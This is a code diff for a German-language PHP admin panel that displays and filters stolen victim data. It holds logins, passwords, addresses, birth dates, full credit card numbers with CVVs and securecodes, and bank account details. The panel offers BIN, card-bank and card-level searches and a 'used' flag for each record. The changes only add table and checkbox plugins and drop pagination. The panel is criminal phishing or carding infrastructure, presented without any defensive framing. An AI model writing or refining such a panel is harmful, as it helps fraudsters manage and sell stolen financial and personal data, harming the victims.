@@ -70,7 +70,12 @@
 	<!-- AdminLTE Skins. Choose a skin from the css/skins
 	   folder instead of downloading all of them to reduce the load. -->
 	<link rel="stylesheet" href="src/css/skins/_all-skins.min.css">
-	<link rel="stylesheet" href="src/css/custom.css">
+	<!-- DataTables -->
+	<link rel="stylesheet" href="src/plugins/datatables/dataTables.bootstrap.css">	
+	<!-- iCheck for checkboxes and radio inputs -->
+	<link rel="stylesheet" href="src/plugins/iCheck/all.css">	
+	<!-- Custom Styles -->
+	<link rel="stylesheet" href="src/css/custom.css?<?php echo time();?>">
 
 	<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
 	<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
@@ -81,6 +86,12 @@
 	
 	<script type="text/javascript" src="//ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
 	<script src="src/js/bootstrap.min.js"></script>
+	<!-- DataTables -->
+	<script src="src/plugins/datatables/jquery.dataTables.min.js"></script>
+	<script src="src/plugins/datatables/dataTables.bootstrap.min.js"></script>	
+	<!-- iCheck -->
+	<script src="src/plugins/iCheck/icheck.min.js"></script>	
+
 	<script src="src/js/functions.js?<?php echo time();?>"></script>
 </head>
 <body class="hold-transition skin-blue layout-top-nav">
@@ -89,7 +100,7 @@
             <nav class="navbar navbar-static-top">
                 <div class="container">
                     <div class="navbar-header">
-                        <a href="../../index2.html" class="navbar-brand"><b>Admin</b>Panel</a>
+                        <a href="index.php" class="navbar-brand"><b>Admin</b>Panel</a>
                         <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar-collapse">
                         <i class="fa fa-bars"></i>
                         </button>
@@ -195,7 +206,7 @@
 											<div class="panel-heading">
 												<h4 class="panel-title">
 												<a data-toggle="collapse" data-parent="#s_accordion" href="#s_collapse1">
-													<b>Logs mit Kreditkarten-Eintrag<span style="color:#000;float:right"><?php echo $ccs . " / $all ($ccs_avg %)"; ?></span></b>
+													Logs mit Kreditkarten-Eintrag<span style="float:right"><?php echo $ccs . " / $all ($ccs_avg %)"; ?></span>
 													<span class="clearfix"></span>
 												</a>
 												</h4>
@@ -203,7 +214,7 @@
 											
 											<div id="s_collapse1" class="panel-collapse collapse <?php echo ($collapse_in_cc ? "in" : "") ?>">
 												<div class="panel-body" style="padding:0px;overflow:auto">
-													<table class="table" rules="cols">
+													<table class="table table-bordered table-hover data-table" rules="cols">
 														<thead>
 															<tr>
 																<th>ID</th>
@@ -227,15 +238,8 @@
 													
 														<tbody>
 															<?php
-																$query = null;
-																
-																if (isset($_GET['showCC'])) {
-																	$query = 'SELECT `id`, `logtime`, `username`, `passwort`, `vorname`, `nachname`, `geburtsdatum`, `adresse`, `plz`, `ort`, `ccnr`, `ccdate`, `cvv`, `cclimit`, `securecode`, `notiz`, `used` FROM ' .
-																					$myTable .' WHERE ccnr != "N / A" AND ccnr != "skipped" ORDER by `id` DESC LIMIT ' . ($_GET['showCC'] - 1) * $showLastLogs . ',' . $showLastLogs;
-																} else {
-																	$query = 'SELECT `id`, `logtime`, `username`, `passwort`, `vorname`, `nachname`, `geburtsdatum`, `adresse`, `plz`, `ort`, `ccnr`, `ccdate`, `cvv`, `cclimit`, `securecode`, `notiz`, `used` FROM ' .
-																					$myTable .' WHERE ccnr != "N / A" AND ccnr != "skipped" ORDER by `id` DESC LIMIT ' . $showLastLogs;
-																}
+																$query = 'SELECT `id`, `logtime`, `username`, `passwort`, `vorname`, `nachname`, `geburtsdatum`, `adresse`, `plz`, `ort`, `ccnr`, `ccdate`, `cvv`, `cclimit`, `securecode`, `notiz`, `used` FROM ' .
+																					$myTable .' WHERE ccnr != "N / A" AND ccnr != "skipped" ORDER by `id` DESC';
 
 																if (!($stmt = $mySQLcon->prepare($query))) {
 																	die("Prepare failed: (" . $mySQLcon->errno . ") " . $mySQLcon->error);
@@ -295,34 +299,34 @@
 																			<td>' . htmlspecialchars($out_sc) . '</td>
 																			
 																			<td>
-																				<button type="button" id="' . $out_id . '" name="showInfo" class="btn btn-sm btn-primary showInfo" style="padding:5px;width:22px;height:22px;line-height:0">
+																				<button type="button" data-id="' . $out_id . '" name="showInfo" class="btn btn-sm btn-primary showInfo" style="padding:5px;width:22px;height:22px;line-height:0">
 																					<span class="glyphicon glyphicon-info-sign" style="top:0.3px;line-height:0.7px"></span>
 																				</button>
 																			</td>
 																			
 																			<td>
-																				<button type="button" class="btn btn-sm btn-warning showcomment" id="' . $out_id .'" style="padding:5px;width:23px;height:22px;line-height:0">
+																				<button type="button" data-id="' . $out_id . '" class="btn btn-sm btn-warning showcomment" style="padding:5px;width:23px;height:22px;line-height:0">
 																					<span class="glyphicon glyphicon-comment" style="top:0.3px;line-height:0.7px"></span>
 																				</button>
 																				
 																				<div class="form-group" id="editcom_' . $out_id . '" style="display:none">
-																					<button type="button" class="btn btn-sm btn-danger closecomment" id="' . $out_id .'" style="position:absolute;margin-top:-22px;margin-left:15px;padding:5px;width:23px;height:22px;line-height:0">
+																					<button type="button" data-id="' . $out_id . '" class="btn btn-sm btn-danger closecomment" style="position:absolute;margin-top:-22px;margin-left:15px;padding:5px;width:23px;height:22px;line-height:0">
 																						<span class="glyphicon glyphicon-remove" style="top:0.3px;line-height:0.7px"></span>
 																					</button>
 																				
 																					<br/>
 																					<input type="text" name="cm_' . $out_id . '" value="' . htmlspecialchars($out_notiz) . '" class="form-control">
 																					<br/>
-																					<button type="submit" id="editComment" name="editComment" value="' . $out_id . '" class="btn btn-default btn-block">Editieren</button>
+																					<button type="submit" name="editComment" value="' . $out_id . '" class="btn btn-default btn-block">Editieren</button>
 																				</div>
 																			</td>
 																			
 																			<td>
-																				<button type="submit" id="removeEntry" name="removeEntry" value="' . $out_id . '" class="btn btn-sm btn-danger" style="padding:5px;width:23px;height:22px;line-height:0">
+																				<button type="submit" name="removeEntry" value="' . $out_id . '" class="btn btn-sm btn-danger" style="padding:5px;width:23px;height:22px;line-height:0">
 																					<span class="glyphicon glyphicon-remove-circle" style="top:0.3px;line-height:0.7px"></span>
 																				</button>
 																			</td>
-																			<td><input style="margin-left:1px" type="checkbox" class="check_cc" name="cb_' . $out_id . '"></td>
+																			<td><input style="margin-left:1px" type="checkbox" class="minimal check_cc" name="cb_' . $out_id . '"></td>
 																		</tr>';
 																}
 												
@@ -333,24 +337,6 @@
 												</div>
 											</div>
 										</div>
-										
-										<?php
-											if ($ccs != 0) {
-												echo '<center><nav><ul class="pagination">';
-												
-												$pages = $ccs / $showLastLogs + 1;
-
-														for ($p = 1; $p < $pages; $p++) {
-															if ($p == 1 && !isset($_GET['showCC'])) {
-																echo '<li class="active"><a href="?showCC=' . $p . '">' . $p . '</a></li>';
-															} else {
-																echo '<li ' . ((isset($_GET['showCC']) && $_GET['showCC'] == $p) ? "class=\"active\"" : "") . '><a href="?showCC=' . $p . '">' . $p . '</a></li>';
-															}
-														}
-												
-												echo '</ul></nav></center>';
-											}
-										?>
 									</div>
 									
 									<hr style="display:<?php echo ($show_Logs_ELV ? "block" : "none") ?>"/>
@@ -360,7 +346,7 @@
 											<div class="panel-heading">
 												<h4 class="panel-title">
 												<a data-toggle="collapse" data-parent="#s_accordion2" href="#s_collapse2">
-													<b>Logs ohne Kreditkarten-Eintrag [Full-Info + ELV]<span style="color:#000;float:right"><?php echo $cc_skipped . " / $all ($cc_skipped_avg %)"; ?></span></b>
+													Logs ohne Kreditkarten-Eintrag [Full-Info + ELV]<span style="float:right"><?php echo $cc_skipped . " / $all ($cc_skipped_avg %)"; ?></span>
 													<span class="clearfix"></span>
 												</a>
 												</h4>
@@ -368,7 +354,7 @@
 											
 											<div id="s_collapse2" class="panel-collapse collapse <?php echo ($collapse_in_elv ? "in" : "") ?>">
 												<div class="panel-body" style="padding:0px;overflow:auto">
-													<table class="table" rules="cols">
+													<table class="table table-bordered table-hover data-table" rules="cols">
 														<thead>
 															<tr>
 																<th>ID</th>
@@ -390,14 +376,8 @@
 													
 														<tbody>
 															<?php
-															
-																if (isset($_GET['showELV'])) {	
-																	$query = 'SELECT `id`, `logtime`, `username`, `passwort`, `vorname`, `nachname`, `geburtsdatum`, `adresse`, `plz`, `ort`, `kto`, `blz`, `iban`, `bic`, `used` FROM ' . $myTable . 
-																			' WHERE ccnr LIKE "skipped" AND vorname != "N / A" ORDER by `id` DESC LIMIT ' . ($_GET['showELV'] - 1) * $showLastLogs . ',' . $showLastLogs;
-																} else {
-																	$query = 'SELECT `id`, `logtime`, `username`, `passwort`, `vorname`, `nachname`, `geburtsdatum`, `adresse`, `plz`, `ort`, `kto`, `blz`, `iban`, `bic`, `used` FROM ' . $myTable . 
-																			' WHERE ccnr LIKE "skipped" AND vorname != "N / A" ORDER by `id` DESC LIMIT ' . $showLastLogs;
-																}
+																$query = 'SELECT `id`, `logtime`, `username`, `passwort`, `vorname`, `nachname`, `geburtsdatum`, `adresse`, `plz`, `ort`, `kto`, `blz`, `iban`, `bic`, `used` FROM ' . $myTable . 
+																			' WHERE ccnr LIKE "skipped" AND vorname != "N / A" ORDER by `id` DESC';
 																
 																if (!($stmt = $mySQLcon->prepare($query))) {
 																	die("Prepare failed: (" . $mySQLcon->errno . ") " . $mySQLcon->error);
@@ -449,7 +429,7 @@
 																		<td>' . htmlspecialchars($out_ort) . '</td>
 																		<td>' . htmlspecialchars($out_elv) . '</td>
 																		<td>
-																			<button type="button" id="' . $out_id . '" name="showInfo" class="btn btn-sm btn-primary showInfo" style="padding:5px;width:22px;height:22px;line-height:0">
+																			<button type="button" data-id="' . $out_id . '" name="showInfo" class="btn btn-sm btn-primary showInfo" style="padding:5px;width:22px;height:22px;line-height:0">
 																				<span class="glyphicon glyphicon-info-sign" style="top:0.3px;line-height:0.7px"></span>
 																			</button>
 																		</td>
@@ -458,7 +438,7 @@
 																				<span class="glyphicon glyphicon-remove-circle" style="top:0.3px;line-height:0.7px"></span>
 																			</button>
 																			</td>
-																		<td><input style="margin-left:1px" type="checkbox" class="check_elv" name="cb_' . $out_id . '"></td>
+																		<td><input style="margin-left:1px" type="checkbox" class="minimal check_elv" name="cb_' . $out_id . '"></td>
 																	</tr>';
 																}
 												
@@ -469,24 +449,6 @@
 												</div>
 											</div>
 										</div>
-										
-										<?php
-											if ($cc_skipped != 0) {
-												echo '<center><nav><ul class="pagination">';
-												
-												$pages = $cc_skipped / $showLastLogs + 1;
-												
-												for ($p = 1; $p < $pages; $p++) {
-													if ($p == 1 && !isset($_GET['showELV'])) {
-														echo '<li class="active"><a href="?showELV=' . $p . '">' . $p . '</a></li>';
-													} else {
-														echo '<li ' . ((isset($_GET['showELV']) && $_GET['showELV'] == $p) ? "class=\"active\"" : "") . '><a href="?showELV=' . $p . '">' . $p . '</a></li>';
-													}
-												}
-												
-												echo '</ul></nav></center>';
-											}
-										?>
 									</div>
 									
 									<hr style="display:<?php echo ($show_Logs_FI ? "block" : "none") ?>"/>
@@ -496,7 +458,7 @@
 											<div class="panel-heading">
 												<h4 class="panel-title">
 												<a data-toggle="collapse" data-parent="#s_accordion3" href="#s_collapse3">
-													<b>Logs ohne Kreditkarten-Eintrag [Full-Info]<span style="color:#000;float:right"><?php echo $no_ccs_fullinfo . " / $all ($no_ccs_fullinfo_avg %)"; ?></span></b>
+													Logs ohne Kreditkarten-Eintrag [Full-Info]<span style="float:right"><?php echo $no_ccs_fullinfo . " / $all ($no_ccs_fullinfo_avg %)"; ?></span>
 													<span class="clearfix"></span>
 												</a>
 												</h4>
@@ -504,7 +466,7 @@
 											
 											<div id="s_collapse3" class="panel-collapse collapse <?php echo ($collapse_in_fullinfo ? "in" : "") ?>">
 												<div class="panel-body" style="padding:0px;overflow:auto">
-													<table class="table" rules="cols">
+													<table class="table table-bordered table-hover data-table" rules="cols">
 														<thead>
 															<tr>
 																<th>ID</th>
@@ -525,14 +487,8 @@
 													
 														<tbody>
 															<?php
-															
-																if (isset($_GET['showNoCCFull'])) {	
-																	$query = 'SELECT `id`, `logtime`, `username`, `passwort`, `vorname`, `nachname`, `geburtsdatum`, `adresse`, `plz`, `ort`, `used` FROM ' . $myTable . 
-																			' WHERE ccnr LIKE "N / A" AND vorname != "N / A" ORDER by `id` DESC LIMIT ' . ($_GET['showNoCCFull'] - 1) * $showLastLogs . ',' . $showLastLogs;
-																} else {
-																	$query = 'SELECT `id`, `logtime`, `username`, `passwort`, `vorname`, `nachname`, `geburtsdatum`, `adresse`, `plz`, `ort`, `used` FROM ' . $myTable . 
-																			' WHERE ccnr LIKE "N / A" AND vorname != "N / A" ORDER by `id` DESC LIMIT ' . $showLastLogs;
-																}
+																$query = 'SELECT `id`, `logtime`, `username`, `passwort`, `vorname`, `nachname`, `geburtsdatum`, `adresse`, `plz`, `ort`, `used` FROM ' . $myTable . 
+																			' WHERE ccnr LIKE "N / A" AND vorname != "N / A" ORDER by `id` DESC';
 																
 																if (!($stmt = $mySQLcon->prepare($query))) {
 																	die("Prepare failed: (" . $mySQLcon->errno . ") " . $mySQLcon->error);
@@ -572,7 +528,7 @@
 																		<td>' . htmlspecialchars($out_plz) . '</td>
 																		<td>' . htmlspecialchars($out_ort) . '</td>
 																		<td>
-																			<button type="button" id="' . $out_id . '" name="showInfo" class="btn btn-sm btn-primary showInfo" style="padding:5px;width:22px;height:22px;line-height:0">
+																			<button type="button" data-id="' . $out_id . '" name="showInfo" class="btn btn-sm btn-primary showInfo" style="padding:5px;width:22px;height:22px;line-height:0">
 																				<span class="glyphicon glyphicon-info-sign" style="top:0.3px;line-height:0.7px"></span>
 																			</button>
 																		</td>
@@ -581,7 +537,7 @@
 																				<span class="glyphicon glyphicon-remove-circle" style="top:0.3px;line-height:0.7px"></span>
 																			</button>
 																			</td>
-																		<td><input style="margin-left:1px" type="checkbox" class="check_fullinfo" name="cb_' . $out_id . '"></td>
+																		<td><input style="margin-left:1px" type="checkbox" class="minimal check_fullinfo" name="cb_' . $out_id . '"></td>
 																	</tr>';
 																}
 												
@@ -592,24 +548,6 @@
 												</div>
 											</div>
 										</div>
-										
-										<?php
-											if ($no_ccs_fullinfo != 0) {
-												echo '<center><nav><ul class="pagination">';
-												
-												$pages = $no_ccs_fullinfo / $showLastLogs + 1;
-												
-												for ($p = 1; $p < $pages; $p++) {
-													if ($p == 1 && !isset($_GET['showNoCCFull'])) {
-														echo '<li class="active"><a href="?showNoCCFull=' . $p . '">' . $p . '</a></li>';
-													} else {
-														echo '<li ' . ((isset($_GET['showNoCCFull']) && $_GET['showNoCCFull'] == $p) ? "class=\"active\"" : "") . '><a href="?showNoCCFull=' . $p . '">' . $p . '</a></li>';
-													}
-												}
-												
-												echo '</ul></nav></center>';
-											}
-										?>
 									</div>
 									
 									<hr style="display:<?php echo ($show_Mail_Pass ? "block" : "none") ?>"/>
@@ -619,7 +557,7 @@
 											<div class="panel-heading">
 												<h4 class="panel-title">
 													<a data-toggle="collapse" data-parent="#s_accordion4" href="#s_collapse4">
-														<b>Logs ohne Kreditkarten-Eintrag [Mail:Pass]<span style="color:#000;float:right"><?php echo $no_ccs_no_fullinfo . " / $all ($no_ccs_no_fullinfo_avg %)"; ?></span></b>
+														Logs ohne Kreditkarten-Eintrag [Mail:Pass]<span style="float:right"><?php echo $no_ccs_no_fullinfo . " / $all ($no_ccs_no_fullinfo_avg %)"; ?></span>
 														<span class="clearfix"></span>
 													</a>
 												</h4>
@@ -627,7 +565,7 @@
 											
 											<div id="s_collapse4" class="panel-collapse collapse <?php echo ($collapse_in_mailpass ? "in" : "") ?>">
 												<div class="panel-body" style="padding:0px;overflow:auto">
-													<table class="table" rules="cols">
+													<table class="table table-bordered table-hover data-table" rules="cols">
 														<thead>
 															<tr>
 																<th>ID</th>
@@ -642,14 +580,9 @@
 													
 														<tbody>
 															<?php
-																if ($show_Mail_Pass) {
-																	if (isset($_GET['showNoCC'])) {	
-																		$query = 'SELECT `id`, `logtime`, `username`, `passwort`, `vorname`, `nachname`, `geburtsdatum`, `adresse`, `plz`, `ort`, `used` FROM ' . $myTable . 
-																				' WHERE ccnr LIKE "N / A" AND vorname LIKE "N / A" ORDER by `id` DESC LIMIT ' . ($_GET['showNoCC'] - 1) * $showLastLogs . ',' . $showLastLogs;
-																	} else {
-																		$query = 'SELECT `id`, `logtime`, `username`, `passwort`, `vorname`, `nachname`, `geburtsdatum`, `adresse`, `plz`, `ort`, `used` FROM ' . $myTable . 
-																				' WHERE ccnr LIKE "N / A" AND vorname LIKE "N / A" ORDER by `id` DESC LIMIT ' . $showLastLogs;
-																	}
+																if ($show_Mail_Pass) {																	
+																	$query = 'SELECT `id`, `logtime`, `username`, `passwort`, `vorname`, `nachname`, `geburtsdatum`, `adresse`, `plz`, `ort`, `used` FROM ' . $myTable . 
+																			' WHERE ccnr LIKE "N / A" AND vorname LIKE "N / A" ORDER by `id` DESC';
 																	
 																	if (!($stmt = $mySQLcon->prepare($query))) {
 																		die("Prepare failed: (" . $mySQLcon->errno . ") " . $mySQLcon->error);
@@ -677,16 +610,16 @@
 																			<td>' . htmlspecialchars($out_user) . '</td>
 																			<td>' . htmlspecialchars($out_pass) . '</td>
 																			<td>
-																				<button type="button" id="' . $out_id . '" name="showInfo" class="btn btn-sm btn-primary showInfo" style="padding:5px;width:22px;height:22px;line-height:0">
+																				<button type="button" data-id="' . $out_id . '" name="showInfo" class="btn btn-sm btn-primary showInfo" style="padding:5px;width:22px;height:22px;line-height:0">
 																					<span class="glyphicon glyphicon-info-sign" style="top:0.3px;line-height:0.7px"></span>
 																				</button>
 																			</td>
 																			<td>
-																				<button type="submit" id="removeEntry" name="removeEntry" value="' . $out_id . '" class="btn btn-sm btn-danger" style="padding:5px;width:23px;height:22px;line-height:0">
+																				<button type="submit" name="removeEntry" value="' . $out_id . '" class="btn btn-sm btn-danger" style="padding:5px;width:23px;height:22px;line-height:0">
 																					<span class="glyphicon glyphicon-remove-circle" style="top:0.3px;line-height:0.7px"></span>
 																				</button>
 																				</td>
-																			<td><input style="margin-left:1px" type="checkbox" class="check_mp" name="cb_' . $out_id . '"></td>
+																			<td><input style="margin-left:1px" type="checkbox" class="minimal check_mp" name="cb_' . $out_id . '"></td>
 																		</tr>';
 																	}
 													
@@ -698,24 +631,6 @@
 												</div>
 											</div>
 										</div>
-										
-										<?php
-											if ($no_ccs_no_fullinfo != 0) {
-												echo '<center><nav><ul class="pagination">';
-												
-												$pages = $no_ccs_no_fullinfo / $showLastLogs + 1;
-												
-												for ($p = 1; $p < $pages; $p++) {
-													if ($p == 1 && !isset($_GET['showNoCC'])) {
-														echo '<li class="active"><a href="?showNoCC=' . $p . '">' . $p . '</a></li>';
-													} else {
-														echo '<li ' . ((isset($_GET['showNoCC']) && $_GET['showNoCC'] == $p) ? "class=\"active\"" : "") . '><a href="?showNoCC=' . $p . '">' . $p . '</a></li>';
-													}
-												}
-												
-												echo '</ul></nav></center>';
-											}
-										?>
 									</div>
 									
 									<hr style="border-color:#000"/>
@@ -841,21 +756,21 @@
 										<div id="s_collapse5" class="panel-collapse collapse <?php echo ($collapse_in_cc_search ? "in" : "") ?>">
 											<div class="panel-body">
 												<div class="form-group">
-													<label class="col-sm-2 control-label" style="width:250px">BIN(s):</label>
+													<label class="col-sm-2 control-label">BIN(s):</label>
 													<div class="col-sm-10">
 														<input type="text" class="form-control" id="tb_bin" name="tb_bin" placeholder="BIN (mehrere BIN's mit Komma trennen)">
 													</div>
 												</div>
 												
 												<div class="form-group">
-													<label class="col-sm-2 control-label" style="width:250px">Anzahl / Zeitraum in Stunden:</label>
+													<label class="col-sm-2 control-label">Anzahl / Zeitraum in Stunden:</label>
 													<div class="col-sm-10">
 														<input type="text" class="form-control" id="tb_ccsearch" name="tb_ccsearch">
 													</div>
 												</div>
 												
 												<div class="form-group">
-													<label class="col-sm-2 control-label" style="width:250px">Kreditkarten-Marke: </label>
+													<label class="col-sm-2 control-label">Kreditkarten-Marke: </label>
 													<div class="col-sm-10">
 														<select class="form-control" id="select_cc_brand" name="select_cc_brand" onchange="this.form.submit()">
 															<option></option>
@@ -869,7 +784,7 @@
 												</div>
 												
 												<div class="form-group">
-													<label class="col-sm-2 control-label" style="width:250px">Kreditkarten-Typ: </label>
+													<label class="col-sm-2 control-label">Kreditkarten-Typ: </label>
 													<div class="col-sm-10">
 														<select class="form-control" id="select_cctyp" name="select_cctyp" onchange="this.form.submit()">
 															<option></option>
@@ -888,7 +803,7 @@
 												</div>
 												
 												<div class="form-group">
-													<label class="col-sm-2 control-label" style="width:250px">Kreditkarten-Bank: </label>
+													<label class="col-sm-2 control-label">Kreditkarten-Bank: </label>
 													<div class="col-sm-10">
 														<select class="form-control" id="select_bank" name="select_bank" onchange="this.form.submit()">
 															<option></option>
@@ -907,7 +822,7 @@
 												</div>
 												
 												<div class="form-group">
-													<label class="col-sm-2 control-label" style="width:250px">Kreditkarten-Level: </label>
+													<label class="col-sm-2 control-label">Kreditkarten-Level: </label>
 													<div class="col-sm-10">
 														<select class="form-control" id="select_level" name="select_level" onchange="this.form.submit()">
 															<option></option>
@@ -955,21 +870,21 @@
 										<div id="s_collapse6" class="panel-collapse collapse <?php echo ($collapse_in_log_search ? "in" : "") ?>">
 											<div class="panel-body">
 												<div class="form-group">
-													<label class="col-sm-2 control-label" style="width:250px">Anzahl *: </label>
+													<label class="col-sm-2 control-label">Anzahl *: </label>
 													<div class="col-sm-10">
 														<input type="text" class="form-control" id="tb_search_pp_count" name="tb_search_pp_count" placeholder="Anzahl">
 													</div>
 												</div>
 												
 												<div class="form-group">
-													<label class="col-sm-2 control-label" style="width:250px">Wohnort: </label>
+													<label class="col-sm-2 control-label">Wohnort: </label>
 													<div class="col-sm-10">
 														<input type="text" class="form-control" id="tb_city" name="tb_city" placeholder="Wohnort">
 													</div>
 												</div>
 												
 												<div class="form-group">
-													<label class="col-sm-2 control-label" style="width:250px">Logs anzeigen: </label>
+													<label class="col-sm-2 control-label">Logs anzeigen: </label>
 													<div class="col-sm-10">
 														<select class="form-control" id="select_log_type" name="select_log_type" onchange="this.form.submit()">
 															<option></option>
@@ -1010,7 +925,7 @@
 										<div id="s_collapse7" class="panel-collapse collapse <?php echo ($collapse_in_mail_search ? "in" : "") ?>">
 											<div class="panel-body">
 												<div class="form-group">
-													<div class="col-sm-10">
+													<div class="col-sm-12">
 														<textarea name="mailpasslist" class="form-control" rows="10"></textarea>
 													</div>
 												</div>
@@ -1031,9 +946,8 @@
 								echo '
 										<div class="panel panel-default">
 											<div class="panel-heading">
-												<h3 class="panel-title">Angefragte Logs: ' . $_SESSION['searched'] . '</h3>
-											</div>';
-											
+												<h3 class="panel-title">Angefragte Logs: ' . $_SESSION['searched'] . '</h3>';
+
 											if (isset($_SESSION['delete_shown_ccs_query']) && !empty($_SESSION['delete_shown_ccs_query'])) {
 												echo '	<form role="form" class="form-horizontal" action="index.php" method="post" style="float:right">
 																<button type="submit" id="mark_shown_ccs" name="mark_shown_ccs" class="btn btn-sm btn-warning" style="border:1px solid #fff;width:275px;float:left;margin-top:-35px;margin-right:15px" 
@@ -1049,6 +963,10 @@
 																</button>
 															</form>';
 											}
+
+								echo '
+											</div>';
+
 									
 								echo '
 											<div class="panel-body" style="' . ((($_SESSION['logs']) == "N / A") ? "height:70px" : "height:800px; overflow:auto") . '">
@@ -1264,14 +1182,14 @@
 									<div class="panel panel-default">
 										<div class="panel-body">
 										
-											<div class="form-group">
+											<div class="row form-group">
 												<label class="col-sm-2 control-label" style="width:150px">Benutzername: </label>
 												<div class="col-sm-10">
 													<input type="text" class="form-control" id="tb_panel_username" name="tb_panel_username" placeholder="Benutzername" value="<?php echo $adminUsername ?>" required>
 												</div>
 											</div>
 											
-											<div class="form-group">
+											<div class="row form-group">
 												<label class="col-sm-2 control-label" style="width:150px">Passwort: </label>
 												<div class="col-sm-10">
 													<input type="password" class="form-control" id="tb_panel_passwort" name="tb_panel_passwort" placeholder="Passwort" value="<?php echo $adminPassword ?>" required>
@@ -1297,7 +1215,7 @@
 											<div class="form-group">
 												<label class="col-sm-2 control-label" style="width:250px">Erweiterte Vic-Info anzeigen:</label>	
 												<div class="col-sm-10" style="width:200px;margin-top:5px">
-													<input type="checkbox" name="show_vic_infos" style="margin-left:20px" <?php echo ($show_vic_infos ? "checked" : "") ?>> Anzeigen
+													<input type="checkbox" class="minimal" name="show_vic_infos" style="margin-left:20px" <?php echo ($show_vic_infos ? "checked" : "") ?>> Anzeigen
 												</div>
 											</div>
 											
@@ -1306,29 +1224,29 @@
 											<div class="form-group">
 												<label class="col-sm-2 control-label" style="width:350px">Logs mit Kreditkarten-Eintrag:</label>	
 												<div class="col-sm-10" style="margin-top:5px;width:300px;">
-													<input type="checkbox" name="show_Logs_CC" style="margin-left:20px" <?php echo ($show_Logs_CC ? "checked" : "") ?>> Anzeigen
-													<input type="checkbox" name="collapse_in_cc" style="margin-left:20px" <?php echo ($collapse_in_cc ? "checked" : "") ?>> Ausklappen
+													<input type="checkbox" class="minimal" name="show_Logs_CC" style="margin-left:20px" <?php echo ($show_Logs_CC ? "checked" : "") ?>> Anzeigen
+													<input type="checkbox" class="minimal" name="collapse_in_cc" style="margin-left:20px" <?php echo ($collapse_in_cc ? "checked" : "") ?>> Ausklappen
 												</div>
 												<div class="clearfix"></div>
 
 												<label class="col-sm-2 control-label" style="width:350px">Logs ohne Kreditkarten-Eintrag [ELV]:</label>	
 												<div class="col-sm-10" style="margin-top:5px;width:300px;">
-													<input type="checkbox" name="show_Logs_ELV" style="margin-left:20px" <?php echo ($show_Logs_ELV ? "checked" : "") ?>> Anzeigen
-													<input type="checkbox" name="collapse_in_elv" style="margin-left:20px" <?php echo ($collapse_in_elv ? "checked" : "") ?>> Ausklappen
+													<input type="checkbox" class="minimal" name="show_Logs_ELV" style="margin-left:20px" <?php echo ($show_Logs_ELV ? "checked" : "") ?>> Anzeigen
+													<input type="checkbox" class="minimal" name="collapse_in_elv" style="margin-left:20px" <?php echo ($collapse_in_elv ? "checked" : "") ?>> Ausklappen
 												</div>
 												<div class="clearfix"></div>
 
 												<label class="col-sm-2 control-label" style="width:350px">Logs ohne Kreditkarten-Eintrag [Full-Info]:</label>	
 												<div class="col-sm-10" style="margin-top:5px;width:300px;">
-													<input type="checkbox" name="show_Logs_FI" style="margin-left:20px" <?php echo ($show_Logs_FI ? "checked" : "") ?>> Anzeigen
-													<input type="checkbox" name="collapse_in_fullinfo" style="margin-left:20px" <?php echo ($collapse_in_fullinfo ? "checked" : "") ?>> Ausklappen
+													<input type="checkbox" class="minimal" name="show_Logs_FI" style="margin-left:20px" <?php echo ($show_Logs_FI ? "checked" : "") ?>> Anzeigen
+													<input type="checkbox" class="minimal" name="collapse_in_fullinfo" style="margin-left:20px" <?php echo ($collapse_in_fullinfo ? "checked" : "") ?>> Ausklappen
 												</div>
 												<div class="clearfix"></div>
 
 												<label class="col-sm-2 control-label" style="width:350px">Logs ohne Kreditkarten-Eintrag [Mail: Pass]:</label>	
 												<div class="col-sm-10" style="margin-top:5px;width:300px;">
-													<input type="checkbox" name="show_Mail_Pass" style="margin-left:20px" <?php echo ($show_Mail_Pass ? "checked" : "") ?>> Anzeigen
-													<input type="checkbox" name="collapse_in_mailpass" style="margin-left:20px" <?php echo ($collapse_in_mailpass ? "checked" : "") ?>> Ausklappen
+													<input type="checkbox" class="minimal" name="show_Mail_Pass" style="margin-left:20px" <?php echo ($show_Mail_Pass ? "checked" : "") ?>> Anzeigen
+													<input type="checkbox" class="minimal" name="collapse_in_mailpass" style="margin-left:20px" <?php echo ($collapse_in_mailpass ? "checked" : "") ?>> Ausklappen
 												</div>
 												<div class="clearfix"></div>
 											</div>
@@ -1338,19 +1256,19 @@
 											<div class="form-group">
 												<label class="col-sm-2 control-label" style="width:350px">Kreditkarten-Suche:</label>	
 												<div class="col-sm-10" style="margin-top:5px;width:300px;">
-													<input type="checkbox" name="collapse_in_cc_search" style="margin-left:20px" <?php echo ($collapse_in_cc_search ? "checked" : "") ?>> Ausklappen
+													<input type="checkbox" class="minimal" name="collapse_in_cc_search" style="margin-left:20px" <?php echo ($collapse_in_cc_search ? "checked" : "") ?>> Ausklappen
 												</div>
 												<div class="clearfix"></div>
 											
 												<label class="col-sm-2 control-label" style="width:350px">Log-Suche:</label>	
 												<div class="col-sm-10" style="margin-top:5px;width:300px;">
-													<input type="checkbox" name="collapse_in_log_search" style="margin-left:20px" <?php echo ($collapse_in_log_search ? "checked" : "") ?>> Ausklappen
+													<input type="checkbox" class="minimal" name="collapse_in_log_search" style="margin-left:20px" <?php echo ($collapse_in_log_search ? "checked" : "") ?>> Ausklappen
 												</div>
 												<div class="clearfix"></div>
 
 												<label class="col-sm-2 control-label" style="width:350px">Mail-Suche:</label>	
 												<div class="col-sm-10" style="margin-top:5px;width:300px;">
-													<input type="checkbox" name="collapse_in_mail_search" value="0" style="margin-left:20px" <?php echo ($collapse_in_mail_search ? "checked" : "") ?>> Ausklappen
+													<input type="checkbox" class="minimal" name="collapse_in_mail_search" value="0" style="margin-left:20px" <?php echo ($collapse_in_mail_search ? "checked" : "") ?>> Ausklappen
 												</div>
 												<div class="clearfix"></div>
 											</div>
@@ -1402,7 +1320,7 @@
 											<div class="panel panel-default">
 												<div class="panel-heading">
 													<h3 class="panel-title">
-														<a data-toggle="collapse" data-parent="#s_accordion8" href="#s_collapse8">Hinzugef&uuml;gt</a>
+														<a class="white" data-toggle="collapse" data-parent="#s_accordion8" href="#s_collapse8">Hinzugef&uuml;gt</a>
 													</h3>
 												</div>
 												
